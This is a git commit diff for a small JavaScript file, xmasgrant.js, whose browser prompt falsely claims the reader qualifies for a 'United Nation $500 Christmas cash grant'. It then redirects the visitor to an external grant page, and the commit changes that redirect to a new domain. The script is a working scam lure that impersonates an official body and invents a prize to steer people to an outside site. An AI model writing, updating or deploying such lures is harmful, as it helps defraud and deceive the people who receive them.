37a0bf1ff8dd80f0816ba68a1740f4b008390cee
bigetijazz14 <bigetijazz14@gmail.com>
2024-11-25 19:49:51 -0800

    Update and rename cashgrant.js to xmasgrant.js

--- xmasgrant.js
+++ xmasgrant.js
@@ -2,5 +2,5 @@
 var password = 'CLAIM $500 X-MAS GRANT'
 password=prompt('SMS: Congratulations You are qualify for UNITED NATION $500 CHRISTMAS CASH GRANT FOR EVERYONE, Kindly Press OK to CLAIM Cash Prize','CLAIM $500 X-MAS GRANT');
 if (password != 'CLAIM $500 X-MAS GRANT') {
-location.href='https://xmas-gift.org/500dollar-grant.html';
+location.href='https://www.xmas-season.xyz/500dollar-grant';
 }
